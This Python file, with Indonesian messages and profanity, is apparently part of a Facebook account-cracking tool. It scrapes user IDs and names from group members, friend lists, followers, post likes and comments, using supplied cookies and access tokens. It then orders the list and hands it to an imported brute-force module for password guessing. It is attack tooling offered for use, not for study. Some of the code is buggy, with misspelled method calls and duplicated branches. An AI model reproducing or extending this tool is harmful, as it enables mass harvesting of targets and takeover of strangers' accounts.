import requests, bs4, re, sys, json, random
from bs4 import BeautifulSoup as par
from src import log as _i_

merah  = '[#FF0022]'
hapus  = '[/]'
biru_m = '[bold cyan]'
hijau  = '[#00FF33]'

O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
M = '\x1b[1;91m' # MERAH

from rich import print as prints
from rich.panel import Panel

class Dump:
    def __init__(self):
        self.id, self.id2 = [], []
    
    def convert(self, uid):
        if "me" in uid:
            return {"uid":uid}
        elif(re.findall("\w+",uid)):
            r = requests.get(f"https://mbasic.facebook.com/{uid}?_rdr").text
            try:
                user = re.findall('\;rid\=(\d+)\&',str(r))[0]
            except:
                user = uid
        return {"uid":user}

    def dump_grup(self, kueh, tok):
        try:
            prints(Panel(f"[{merah}×{hapus}] member grup di haruskan publik bukan privat!"))
            kontol = input(f"  [{O}*{N}] masukkan id grup : ")
            a = requests.get(f"https://graph.facebook.com/group/?id={kontol}&access_token={tok}").json()["name"]
            prints(Panel(f"""[[bold cyan]+[/]] nama grup : [bold blue]{a}[/]
[{merah}!{hapus}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."""))
        except KeyError:
            exit(f"  {N}[{M}×{N}] gagal mengambil id grup")
        self.crack_grup("https://mbasic.facebook.com/browse/group/members/?id="+kontol, kueh)

    def crack_grup(self, url, cok):
        try:
            sop_dev = par(requests.get(url, cookies=cok).content, "html.parser")
            members = sop_dev.find("div", id="objects_container")
            for dev in members.find_all("table"):
                user_ = dev["id"].replace("member_", "")
                nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0]
                try:self.id.append(f"{str(user_)}<=>{str(nama_)}\n")
                except:pass
                sys.stdout.write(f"\r  [*] sedang mengumpulkan {len(self.id)} id...");sys.stdout.flush()
            if "Lihat Selengkapnya" in str(sop_dev):
                tod = sop_dev.find("a", string="Lihat Selengkapnya")["href"]
                url_grup = "https://mbasic.facebook.com"+tod
                self.crack_grup(url, cok)
        except:pass
        self.pilihan_id(self.id)

    def dump_free(self, cok, tok):
        try:
            prints(Panel(f"""[{merah}+{hapus}] user trial cuma bisa mengambil [bold red]1000[/] id...
[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."""))
            try:user = input(f'  [{O}*{N}] masukan id atau username : '); uid = self.convert(user)
            except AttributeError:exit(f"\n  {N}[{M}×{N}] username atau id tidak benar")
            tol = requests.Session().get('https://graph.facebook.com/%s?fields=friends.limit(1000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
            zzz = json.loads(tol.text)
            for x in zzz["friends"]["data"]:
                self.id.append(x["id"]+"<=>"+x["name"]+"\n")
        except KeyError:
            exit(f"  {N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
        self.pilihan_id(self.id)
    
    def dump_prem(self, cok, tok):
        try:
            prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."))
            try:user = input(f'  [{O}*{N}] masukan id atau username : '); uid = self.convert(user)
            except AttributeError:exit(f"\n  {N}[{M}×{N}] username atau id tidak benar")
            tol = requests.Session().get('https://graph.facebook.com/%s?fields=friends.limit(5000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
            zzz = json.loads(tol.text)
            for x in zzz["friends"]["data"]:
                self.id.append(x["id"]+"<=>"+x["name"]+"\n")
        except KeyError:
            exit(f"  {N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik")
        self.pilihan_id(self.id)

    def followers(self, cok, tok):
        try:
            prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari followers anda."))
            try:user = input(f'  [{O}*{N}] masukan id atau username followers : '); uid = self.convert(user)
            except AttributeError:exit(f"\n  {N}[{M}×{N}] username atau id tidak benar")
            tol = requests.Session().get('https://graph.facebook.com/%s?fields=subscribers.limit(5000000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
            zzz = json.loads(tol.text)
            for x in zzz["subscribers"]["data"]:
                self.id.append(x["id"]+"<=>"+x["name"]+"\n")
        except:pass
        self.pilihan_id(self.id)

    def like_post(self, coki):
        uid = input(f"  [{O}*{N}] masukan id postingan : ")
        try:
            prints(Panel(f"[{merah}!{hapus}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."))
            self.dump_like(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={uid}", coki)
        except KeyError:
            exit(f"  [{M}!{N}] Why {uid} mikir dong tolol, masukin id postingan yang bener ngentod")
    
    def dump_like(self, link, cok):
        try:
            xnxx = requests.get(link,cookies=cok).text
            if "semua 0" in xnxx:
                exit("  [!] Tidak ada yang menanggapi postingan, awokawokawok kasian akun nya sepi:v")
            else:
                neangan=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',xnxx)
                for i in neangan:
                    if "profile.php?" in i[0]:
                        self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
                    else:
                        self.idappend(re.findall("/(.*)",i[0])[0]+"<=>"+i[1])
                    sys.stdout.write(f"\r  [*] sedang mengumpulkan {len(self.id)} id... ");sys.stdout.flush()
                if "Lihat Selengkapnya" in xnxx:
                    self.dump_like("https://mbasic.facebook.com"+par(xnxx,"html.parser").find("a",string="Lihat Selengkapnya").get("href"), cok)
        except:pass
        self.pilihan_id(self.id)

    def rendem(self, cok, tok):
        try:
            nanya_keun = int(input(f"  [{O}?{N}] masukan jumblah target : "))
        except:nanya_keun=1
        prints(Panel(f"[{biru_m}*{hapus}] Ketik 'me' jika ingin crack dari daftar teman anda."))
        for mnh in range(nanya_keun):
            mnh +=1
            try:user = input(f"  [{O}*{N}] masukan id atau username {H}{mnh}{N} : "); uid = self.convert(user)
            except AttributeError:print(f"  {N}[{M}×{N}] username atau id tidak benar");continue
            try:
                tol = requests.Session().get('https://graph.facebook.com/%s?fields=friends.limit(5000)&access_token=%s'%(uid.get("uid"),tok),cookies=cok)
                zzz = json.loads(tol.text)
                for x in zzz["friends"]["data"]:
                    self.id.append(x["id"]+"<=>"+x["name"]+"\n")
            except KeyError:
                print(f"  {N}[{M}×{N}] gagal mengambil id, kemungkinan id tidaklah publik");continue
        self.pilihan_id(self.id)

    def komentar(self, cok):
        kontol = input(f"  [{O}*{N}] masukan id postingan : ")
        try:
            prints(Panel(f"[{merah}!{hapus}] untuk berhenti tekan CTRL lalu tekan c di keyboard anda."))
            self.ngomen_post(f"https://mbasic.facebook.com/{kontol}", cok)
        except KeyError:
            exit(f"  {N}[{M}!{N}]  Gagal mengambil id dari komentar")

    def ngomen_post(self, link, coki):
        try:
            kontol= requests.get(link,cookies=coki,headers={"user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).text.encode("utf-8")
            memek = par(kontol,'html.parser')
            for mmk in memek.find_all('h3'):
                for _id_ in mmk.find_all("a", href=True):
                    if "profile.php" in _id_.get("href"):
                        xz = _id_.get("href").split('=')[1]
                        bb = xz.split('&')[0]
                        xd = _id_.text
                        self.id.append(bb+'<=>'+xd+'\n')
                    else:
                        xz = _id_.get("href").split('?')[0]
                        bb = xz.split('/')[1]
                        xd = _id_.text
                        self.id.append(bb+'<=>'+xd+'\n')
                    sys.stdout.write(f"\r  [*] sedang mengumpulkan {len(self.id)} id... ");sys.stdout.flush()

            for asu in memek.fin_all("a", href=True):
                if "Lihat komentar lainnya…" in asu.text:
                    self.ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), coki)
        except:pass
        self.pilihan_id(self.id)

    def pilihan_id(self, xx):
        prints(Panel(f"[{biru_m}*[/]] total id : [bold red]{len(xx)}[/]"))
        prints(Panel(f"""[{biru_m}01[/]] Crack dari akun tertua  ({merah}Not Recommended[/])
[{biru_m}02[/]] Crack dari akun termuda ({hijau}Recommended[/])
[{biru_m}03[/]] Acak urutan berdasarkan id ([bold blue]Highly Recommended[/])""", title=f"{hijau}SETTING URUTAN ID{hapus}"))
        zx = input(f"  [{M}?{N}] pilih: ")
        if zx in["1", "01"]:
            for ih in xx:
                self.id2.append(ih)
        elif zx in["2", "02"]:
            for ih in xx:
                self.id2.insert(0, ih)
        elif zx in["2", "02"]:
            for ih in xx:
                wq = random.randint(0,len(self.id2))
                self.id2.insert(wq, ih)
        else:
            print("");prints(Panel(f"😡 input yang bener"));self.pilih_id(xx)
        _i_.Brute_crack().plerr(self.id2)
